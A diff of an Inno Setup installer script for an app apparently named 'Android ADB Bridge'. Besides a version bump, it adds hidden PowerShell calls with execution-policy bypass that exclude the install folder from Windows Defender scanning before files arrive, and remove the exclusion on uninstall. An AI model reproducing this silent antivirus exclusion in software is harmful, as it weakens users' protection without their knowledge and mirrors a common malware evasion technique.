@@ -1,7 +1,7 @@
 [Setup]
 ; Basic App Info
 AppName=Android ADB Bridge
-AppVersion=5.0.9
+AppVersion=5.1.0
 AppPublisher=nuken
 DefaultDirName={autopf}\AndroidBridge
 DisableProgramGroupPage=yes
@@ -9,7 +9,7 @@ DisableProgramGroupPage=yes
 SetupIconFile=icon.ico
 ; Where the final setup.exe will be saved
 OutputDir=Output
-OutputBaseFilename=AndroidBridge_Setup_v5.0.9
+OutputBaseFilename=AndroidBridge_Setup_v5.1.0
 Compression=lzma
 SolidCompression=yes
 ; Require admin rights to add firewall rules
@@ -50,8 +50,13 @@ Filename: "{app}\AndroidBridge.exe"; Parameters: "-ui"; Description: "Open Dashb
 ; Clean up the firewall rule if the user uninstalls the app
 Filename: "{sys}\netsh.exe"; Parameters: "advfirewall firewall delete rule name=""Android ADB Bridge"" program=""{app}\AndroidBridge.exe"""; Flags: runhidden; RunOnceId: "RemoveFirewallRule"
 
+; Remove the Windows Defender exclusion during uninstallation
+Filename: "powershell.exe"; \
+    Parameters: "-ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath '{app}'"""; \
+    Flags: runhidden; RunOnceId: "RemoveDefenderExclusion"
+	
 [Code]
-// This runs right before the installation starts
+// This runs right before the installation wizard even starts
 function InitializeSetup(): Boolean;
 var
   ResultCode: Integer;
@@ -61,6 +66,25 @@ begin
   Exec('taskkill.exe', '/F /IM adb.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   Exec('taskkill.exe', '/F /IM ffmpeg.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   Result := True;
+end;
+
+// This triggers at different steps during the installation process
+procedure CurStepChanged(CurStep: TSetupStep);
+var
+  ResultCode: Integer;
+  AppPath: String;
+begin
+  // ssInstall means the user clicked "Install" but file extraction has NOT started yet
+  if CurStep = ssInstall then
+  begin
+    // Grab the actual installation path the user chose (defaults to C:\Program Files (x86)\AndroidBridge)
+    AppPath := ExpandConstant('{app}');
+    
+    // Execute the PowerShell command to whitelist the directory BEFORE files arrive
+    Exec('powershell.exe', 
+         '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath ''' + AppPath + '''"', 
+         '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+  end;
 end;
 
 // This runs right before the uninstallation starts
